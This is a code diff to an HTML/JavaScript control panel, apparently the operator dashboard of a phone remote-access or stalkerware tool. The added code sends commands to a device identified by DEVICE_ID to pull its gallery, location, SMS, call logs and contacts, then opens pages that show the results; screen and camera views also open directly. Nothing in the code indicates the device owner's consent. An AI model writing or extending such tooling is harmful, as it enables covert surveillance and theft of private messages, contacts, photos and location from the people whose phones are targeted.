@@ -32,7 +32,6 @@
         /* --- FIXED CONTAINER (Laptop Fix + Phone Fix) --- */
         .container {
             width: 100%; 
-            /* 400px maximum rakha hai taki laptop par neat dikhe */
             max-width: 400px; 
             background: rgba(0, 0, 0, 0.5);
             border-radius: 25px; padding: 15px;
@@ -75,8 +74,8 @@
         .controls-grid { 
             display: grid; 
             grid-template-columns: repeat(4, 1fr); 
-            grid-auto-rows: 75px; /* Height fix rakhi hai */
-            gap: 8px; /* Gap thora kam kiya taaki phone par button bade dikhe */
+            grid-auto-rows: 75px; 
+            gap: 8px; 
         }
 
         .slider-card {
@@ -294,10 +293,40 @@
                 .catch(err => console.log("Connection Error:", err));
         }
 
+        // --- NEW LOGIC FOR GALLERY & DATA BUTTONS ---
         function openView(page) {
             if(!DEVICE_ID) return askID();
-            window.location.href = `view_${page}.html?id=${DEVICE_ID}`;
+
+            // Ye wo pages hain jo pehle Data mangte hain
+            const commands = {
+                'gallery': 'gallery',
+                'location': 'location',
+                'sms': 'sms',
+                'call_logs': 'call_logs',
+                'contacts': 'contacts'
+            };
+
+            // Agar user ne Gallery/SMS/Location dabaya, to pehle COMMAND bhejo
+            if (commands[page]) {
+                sendCommand(commands[page]); // Pehle order bheja
+                
+                // User ko batao ki request gayi hai
+                const btn = event.currentTarget; // Jo button dabaya usko pakda
+                const originalText = btn.querySelector('span').innerText;
+                btn.querySelector('span').innerText = "Requesting...";
+                
+                // 1.5 Second baad page kholo (taaki server process kar sake)
+                setTimeout(() => {
+                    btn.querySelector('span').innerText = originalText;
+                    window.location.href = `view_${page}.html?id=${DEVICE_ID}`;
+                }, 1500);
+
+            } else {
+                // Screen ya Camera ke liye direct jao
+                window.location.href = `view_${page}.html?id=${DEVICE_ID}`;
+            }
         }
+
         function openDirect(filename) {
             if(!DEVICE_ID) return askID();
             window.location.href = `${filename}?id=${DEVICE_ID}`;
@@ -309,8 +338,9 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ device_id: DEVICE_ID, command: action })
-            });
-            console.log("Sent: " + action);
+            })
+            .then(res => console.log("Sent Success: " + action))
+            .catch(err => console.error("Send Failed", err));
         }
 
         function updateSliderUI(type, val) {
